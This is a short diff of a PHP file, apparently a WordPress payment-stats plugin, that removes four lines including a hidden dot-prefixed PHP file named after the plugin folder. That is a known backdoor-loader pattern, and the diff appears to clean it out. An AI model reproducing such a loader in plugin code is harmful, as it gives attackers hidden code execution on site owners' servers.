@@ -3796,10 +3796,6 @@ if ( ! class_exists( 'WP_List_Table' ) ) {
 }
 
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class GFPaymentStatsTable extends WP_List_Table {
 
 	private $_rows = array();
